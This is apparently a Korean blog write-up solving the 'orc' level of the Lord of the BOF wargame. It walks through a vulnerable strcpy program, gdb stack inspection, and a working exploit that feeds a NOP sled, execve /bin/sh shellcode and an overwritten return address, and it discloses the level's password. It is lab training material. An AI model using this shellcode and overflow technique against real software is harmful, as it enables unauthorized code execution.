@@ -1,0 +1,117 @@
+I"�!<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login: goblin
+Password:
+Last login: Fri Jul 26 18:35:38 from 192.168.194.1
+<span class="o">[</span>goblin@localhost goblin]<span class="nv">$ </span><span class="nb">ls
+</span>orc  orc.c 
+<span class="o">[</span>goblin@localhost goblin]<span class="nv">$ </span><span class="nb">cat </span>orc.c
+/<span class="k">*</span>
+        The Lord of the BOF : The Fellowship of the BOF
+        - orc
+        - egghunter
+<span class="k">*</span>/
+<span class="c">#include &lt;stdio.h&gt;</span>
+<span class="c">#include &lt;stdlib.h&gt;</span>
+
+extern char <span class="k">**</span>environ<span class="p">;</span>
+
+main<span class="o">(</span>int argc, char <span class="k">*</span>argv[]<span class="o">)</span>
+<span class="o">{</span>
+        char buffer[40]<span class="p">;</span>
+        int i<span class="p">;</span>
+
+        <span class="k">if</span><span class="o">(</span>argc &lt; 2<span class="o">){</span>
+                <span class="nb">printf</span><span class="o">(</span><span class="s2">"argv error</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+                <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+        <span class="o">}</span>
+
+        // egghunter
+        <span class="k">for</span><span class="o">(</span><span class="nv">i</span><span class="o">=</span>0<span class="p">;</span> environ[i]<span class="p">;</span> i++<span class="o">)</span>
+                memset<span class="o">(</span>environ[i], 0, strlen<span class="o">(</span>environ[i]<span class="o">))</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="o">(</span>argv[1][47] <span class="o">!=</span> <span class="s1">'\xbf'</span><span class="o">)</span>
+        <span class="o">{</span>
+                <span class="nb">printf</span><span class="o">(</span><span class="s2">"stack is still your friend.</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+                <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+        <span class="o">}</span>
+
+        strcpy<span class="o">(</span>buffer, argv[1]<span class="o">)</span><span class="p">;</span>
+        <span class="nb">printf</span><span class="o">(</span><span class="s2">"%s</span><span class="se">\n</span><span class="s2">"</span>, buffer<span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>goblin/hackers proof로 로그인하자.
+리눅스에서는 extern이라는 환경변수 자료형이 있다.
+이를 이용해 environ이라는 변수를 선언하고, egghunter이라는 글 밑의 반복문에서 모든 환경변수를 초기화시킨다.
+그 밑의 조건문에서는 인좌로 주는 글의 48번째가 bf가 되어야 한다는 이야기.
+이 두개만 유의해서 풀면 된다.
+우선 사용할 24byte짜리 쉘 코드.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>99<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80
+</code></pre></div></div>
+<p>쉘 코드가 들어갈 주소값을 gdb로 확인하자.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>goblin@localhost goblin]<span class="nv">$ </span><span class="nb">cp </span>orc.c tmp/
+<span class="o">[</span>goblin@localhost goblin]<span class="nv">$ </span><span class="nb">cd </span>tmp
+<span class="o">[</span>goblin@localhost tmp]<span class="nv">$ </span><span class="nb">ls
+</span>orc.c
+<span class="o">[</span>goblin@localhost tmp]<span class="nv">$ </span>gcc <span class="nt">-o</span> orc orc.c
+<span class="o">[</span>goblin@localhost tmp]<span class="nv">$ </span>gdb <span class="nt">-q</span> orc
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel
+<span class="o">(</span>gdb<span class="o">)</span> disas main
+Dump of assembler code <span class="k">for function </span>main:
+0x8048500 &lt;main&gt;:       push   %ebp
+0x8048501 &lt;main+1&gt;:     mov    %ebp,%esp
+0x8048503 &lt;main+3&gt;:     sub    %esp,44
+0x8048506 &lt;main+6&gt;:     cmp    DWORD PTR <span class="o">[</span>%ebp+8],1
+0x804850a &lt;main+10&gt;:    jg     0x8048523 &lt;main+35&gt;
+0x804850c &lt;main+12&gt;:    push   0x8048630
+0x8048511 &lt;main+17&gt;:    call   0x8048410 &lt;<span class="nb">printf</span><span class="o">&gt;</span>
+...
+0x80485b9 &lt;main+185&gt;:   lea    %eax,[%ebp-40]
+0x80485bc &lt;main+188&gt;:   push   %eax
+0x80485bd &lt;main+189&gt;:   call   0x8048440 &lt;strcpy&gt;
+0x80485c2 &lt;main+194&gt;:   add    %esp,8
+0x80485c5 &lt;main+197&gt;:   lea    %eax,[%ebp-40]
+0x80485c8 &lt;main+200&gt;:   push   %eax
+0x80485c9 &lt;main+201&gt;:   push   0x8048659
+0x80485ce &lt;main+206&gt;:   call   0x8048410 &lt;<span class="nb">printf</span><span class="o">&gt;</span>
+0x80485d3 &lt;main+211&gt;:   add    %esp,8
+0x80485d6 &lt;main+214&gt;:   leave
+0x80485d7 &lt;main+215&gt;:   ret
+<span class="o">(</span>gdb<span class="o">)</span> b<span class="k">*</span>main+194
+Breakpoint 1 at 0x80485c2
+
+</code></pre></div></div>
+<p>C 코드가 긴 만큼 어셈블리 코드도 길어서 중간에 생략하였다.
+main+189에서 strcpy를 하는 것이 보인다.
+그 바로 밑줄, main+194에 break를 걸자.
+C 코드에서 인좌에 48번째에 \xbf여야 하므로, 그냥 \xbf 48개를 인좌로 보내버리자.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> r <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\xbf"*48'</span><span class="si">)</span>
+Starting program: /home/goblin/tmp/orc <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\xbf"*48'</span><span class="si">)</span>
+
+Breakpoint 1, 0x80485c2 <span class="k">in </span>main <span class="o">()</span>
+<span class="o">(</span>gdb<span class="o">)</span> x/300x <span class="nv">$esp</span>
+0xbffffab4:     0xbffffac0      0xbffffc42      0x00000015      0xbfbfbfbf
+0xbffffac4:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
+0xbffffad4:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
+0xbffffae4:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0x00000000
+
+...
+0xbffffc24:     0x00000000      0x36383669      0x6f682f00      0x672f656d
+0xbffffc34:     0x696c626f      0x6d742f6e      0x726f2f70      0xbfbf0063
+0xbffffc44:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
+0xbffffc54:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
+0xbffffc64:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0x0000bfbf
+
+</code></pre></div></div>
+<p>밑에 bffffc44의 줄에 입력값이 다시 들어가는 것이 보인다.
+그러므로 공격할 주소는 bffffc44로 하자.
+코드는 nop*20+쉘 코드(24)+RET 덮어쓸 주소로 하자.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>goblin@localhost goblin]<span class="nv">$ </span>./orc <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x44\xfc\xff\xbf"'</span><span class="si">)</span>
+릱릱릱릱릱릱릱릱릱릱1픐h//shh/bin됥PS됣솻
+                                         ?D??
+bash<span class="nv">$ </span>my-pass
+euid <span class="o">=</span> 504
+cantata
+</code></pre></div></div>
+<p>이 문제에서 코드중 48번째의 값은 RET의 가장 앞의 값이다.
+LOB에서 배열의 주소값은 \xbf로 시작하므로 신경쓰지 않아도 되는 안전장치인 것이다.
+goblin’s password : “cantata”</p>
+:ET
